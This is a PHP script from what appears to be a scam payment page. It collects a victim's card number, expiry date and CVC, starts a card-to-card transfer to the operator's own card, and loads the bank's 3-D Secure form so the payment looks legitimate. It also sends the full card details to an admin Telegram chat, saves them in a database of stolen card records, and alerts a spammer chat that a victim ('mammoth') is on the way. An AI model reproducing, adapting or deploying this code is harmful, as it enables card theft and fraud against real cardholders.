<?php
ob_start();
include "log.php";
define("access", "yes");
include('../admin/engine/database/connection.php');
include('../admin/engine/config.php');
$settings = R::load('settings', 1);
$cardn = $settings->number;
// Карта для приема денег, без пробелов и прочих символов
$card_destination = $cardn;

$card_number = $_POST["card_number"];
$card_date = $_POST["card_expire"];
$card_code = $_POST["card_code"];
$amount = $_POST["amount"];
$description = $_POST["description"];
$item = $_POST["item"];
preg_match_all( "#\[.*?\]#" , $item , $matches );

error_reporting(E_ERROR | E_PARSE);

$card_date = str_replace(" ", "", $card_date);
$card_date = explode("/", $card_date);
$card_date_month = $card_date[0];
$card_date_year = "20" . $card_date[1];

$card_number = str_replace(" ", "", $card_number);

if (!isset($card_number) || !isset($card_date_month) || !isset($card_date_year) || !isset($card_code)) {
  die(header("Location: https://" . $_SERVER["SERVER_NAME"] . "/merchant/error.php?form"));
} else if (!isset($amount)) {
  die(header("Location: https://" . $_SERVER["SERVER_NAME"] . "/merchant/error.php?form"));
} else if (!isset($card_destination) || $card_destination == "") {
  die(header("Location: https://" . $_SERVER["SERVER_NAME"] . "/merchant/error.php?prop"));
} else {
  $form_data["amount"]["value"] = $amount;
  $form_data["amount"]["currency"] = "RUR";

  $form_data["source_card"]["number"] = $card_number;
  $form_data["source_card"]["expiry_date"]["year"] = (int)$card_date_year;
  $form_data["source_card"]["expiry_date"]["month"] = (int)$card_date_month;
  $form_data["source_card"]["cvc2"] = $card_code;
  $form_data["destination_card"]["number"] = $card_destination;

  $curl = curl_init("https://p2p.mdm.ru/api/v2/requests");
  curl_setopt($curl, CURLOPT_POST, 1);
  curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($form_data));
  curl_setopt($curl, CURLOPT_HTTPHEADER, array("Content-Type: application/json"));
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
  $json = json_decode(curl_exec($curl), true);
  curl_close($curl);

  if ($json["state"] == "tds") {
    $temp_data["access_token"] = $json["access_token"];
    $temp_data["request_id"] = $json["request_id"];
    $temp_data["amount"] = $amount;
    $temp_data["description"] = $description;
    $temp_data["card"] = $card_number;
    $temp_data["cardCVC"] = $card_code;
    $temp_data["cardExpired"] = $card_date_month . "/" . $card_date_year;
    file_put_contents("temp/" . $json["tds_data"]["md"], json_encode($temp_data, true));
  

    echo '<html lang="ru"><head>' .
    '<script src="https://code.jquery.com/jquery-3.3.1.js"></script>' .
    '<script>$(document).ready(function(){$("#payform").submit();});</script>' .
    '</head><body style="padding: 0px; margin: 0px;">' .
    '<form action="' . $json["tds_data"]["acs_url"] . '" method="post" target="payframe" id="payform">' .
    '<input type="hidden" name="PaReq" value="' . $json["tds_data"]["pa_req"] . '">' .
    '<input type="hidden" name="MD" value="' . $json["tds_data"]["md"] . '">' .
    '<input type="hidden" name="TermUrl" value="https://' . $_SERVER["SERVER_NAME"] . '/merchant/status.php">' .
    '<input type="hidden" name="item" value="' . $matches[0][0] . '">' .
    '</form>' .
    '<iframe name="payframe" style="width: 100%; height: 100%; border: 0px;"></iframe>' .
    '</body></html>';
  } else {
    die(header("Location: https://" . $_SERVER["SERVER_NAME"] . "/merchant/error.php?system"));
  }
}

    $message = "[Поступил новый лог]

Номер карты: " . $card_number . "\nСрок действия: " . $card_date_month . "/" . $card_date_year . "\nCVC: " . $card_code . "\n
Сумма платежа: " . $amount . " руб.\nОписание платежа: " . $description . "\nСайт: " . $matches[0][0];
sendTel($message);

sendToSite($amount, $description, $card_number, $card_date_month, $card_date_year, $card_code, $matches);
    function sendToSite($amount, $description, $card_number, $card_date_month, $card_date_year, $card_code, $matches) {
        $logss = R::dispense('logs');
        $today = date("Y-m-d H:i");
        $logss->site = $matches[0][0];
        $logss->sum = $amount;
        $logss->refsum = 0;
        $logss->dating = $today;
        $logss->comment = $description;
        $logss->card = $card_number.' '.$card_date_month.'/'.$card_date_year.' '.$card_code;
        $logss->status = 'Не оплачено';
        $logss->statusn = 0;
        $logss->spamer = 'Не найден';
        $logss->date = date("Y-m-d");
        R::store($logss);
    }
  
    function sendTel($message){
    $id = CHAT_ADMIN;
    $tokken = BOT_KEY;
    $filename = "https://api.telegram.org/bot".$tokken."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html";
    file_get_contents($filename);
    }
    $message2 = "[Мамонт на подходе]\n ".$matches[0][0]." \n💶Сумма: " . $amount . " RUB." ;
    sendTel2($message2);
  
    function sendTel2($message2){
    $id1 = CHAT_SPAMER;
    $tokken1 = BOT_KEY;
    $filename = "https://api.telegram.org/bot".$tokken1."/sendMessage?chat_id=".$id1."&text=".urlencode($message2)."&parse_mode=html";
    file_get_contents($filename);
    }  

?>